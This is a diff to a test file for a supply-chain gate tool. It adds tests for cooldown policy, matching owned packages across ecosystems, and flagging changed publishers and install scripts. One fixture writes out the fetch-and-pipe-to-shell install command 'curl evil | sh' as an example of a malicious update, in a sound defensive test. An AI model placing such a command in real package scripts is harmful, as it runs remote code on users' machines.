@@ -5,9 +5,10 @@ import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 
 import { main } from "../src/cli.ts";
-import { DEFAULT_CONFIG } from "../src/config.ts";
+import { DEFAULT_CONFIG, isOwnPackage, type OwnPackages } from "../src/config.ts";
 import { cooldownOf, heldUntil, strictestPolicy } from "../src/cooldown.ts";
 import { releaseSignals } from "../src/npm-registry.ts";
+import type { PackageName } from "../src/package-version.ts";
 import type { HeldVersion } from "../src/release-age.ts";
 import { runCompare } from "../src/gate.ts";
 import { REPORT_SCHEMA_VERSION } from "../src/report.ts";
@@ -55,15 +56,24 @@ describe("the cooldown in a comparison", () => {
 });
 
 describe("strictestPolicy", () => {
-  it("takes the longer wait and only the own packages both sides name", () => {
-    const own = (npmScopes: string[], actionOwners: string[]) => ({ ...DEFAULT_CONFIG.ownPackages, npmScopes, actionOwners });
-    const policy = strictestPolicy(
-      { ...DEFAULT_CONFIG, releaseAgeDays: 3, ownPackages: own(["@leanish", "@added"], ["Leanish"]) },
-      { ...DEFAULT_CONFIG, releaseAgeDays: 10, ownPackages: own(["@leanish"], ["leanish"]) },
-    );
+  const own = (overrides: Partial<OwnPackages>): OwnPackages => ({ ...DEFAULT_CONFIG.ownPackages, ...overrides });
+  const policy = strictestPolicy(
+    { ...DEFAULT_CONFIG, releaseAgeDays: 3, ownPackages: own({ npmScopes: ["@leanish", "@added"], actionOwners: ["Leanish"], pluginIdPrefixes: ["com.acme.tools."] }) },
+    { ...DEFAULT_CONFIG, releaseAgeDays: 10, ownPackages: own({ npmScopes: ["@leanish"], actionOwners: ["leanish"], pluginIdPrefixes: ["com.acme."] }) },
+  );
+  const isOwn = (pkg: PackageName) => isOwnPackage(policy.ownPackages, pkg);
+
+  it("takes the longer wait", () => {
     expect(policy.releaseAgeDays).toBe(10);
-    expect(policy.ownPackages.npmScopes).toEqual(["@leanish"]);
-    expect(policy.ownPackages.actionOwners).toEqual(["Leanish"]);
+  });
+
+  it("owns a package only where both sides own it, however each side spells it", () => {
+    expect(isOwn({ ecosystem: "npm", name: "@leanish/tool" })).toBe(true);
+    expect(isOwn({ ecosystem: "npm", name: "@added/tool" })).toBe(false);
+    expect(isOwn({ ecosystem: "GitHub Actions", name: "leanish/supply-chain" })).toBe(true);
+    // Overlapping prefixes: both sides own this plugin marker, though neither lists the other's prefix.
+    expect(isOwn({ ecosystem: "Maven", name: "com.acme.tools.check:com.acme.tools.check.gradle.plugin" })).toBe(true);
+    expect(isOwn({ ecosystem: "Maven", name: "com.acme.other:com.acme.other.gradle.plugin" })).toBe(false);
   });
 });
 
@@ -118,13 +128,18 @@ describe("releaseSignals", () => {
 
   it("says what changed against the replaced version", () => {
     const doc = { times: {}, versions: { "1.0.0": manifest("alice"), "1.0.1": { ...manifest("mallory", { scripts: { postinstall: "node x.js", test: "t" } }), ...attested } } };
-    expect(releaseSignals(doc, "lib", "1.0.1", ["1.0.0"])).toEqual(["has provenance", "publisher changed: mallory (before: alice)", "adds install scripts: postinstall"]);
+    expect(releaseSignals(doc, "lib", "1.0.1", ["1.0.0"])).toEqual(["has provenance", "publisher changed: mallory (before: alice)", "adds or changes install scripts: postinstall"]);
   });
 
   it("says when nothing changed, or when there's nothing to compare with", () => {
     const doc = { times: {}, versions: { "1.0.0": manifest("alice", { scripts: { install: "x" } }), "1.0.1": manifest("alice", { scripts: { install: "x" } }) } };
     expect(releaseSignals(doc, "lib", "1.0.1", ["1.0.0"])).toEqual(["no provenance", "published by alice, as before", "install scripts as before: install"]);
     expect(releaseSignals(doc, "lib", "1.0.1", [])).toEqual(["no provenance", "published by alice", "install scripts: install"]);
+  });
+
+  it("counts a changed install command as a change", () => {
+    const doc = { times: {}, versions: { "1.0.0": manifest("alice", { scripts: { install: "node a.js" } }), "1.0.1": manifest("alice", { scripts: { install: "curl evil | sh" } }) } };
+    expect(releaseSignals(doc, "lib", "1.0.1", ["1.0.0"])[2]).toBe("adds or changes install scripts: install");
   });
 
   it("calls what it can't read unknown", () => {
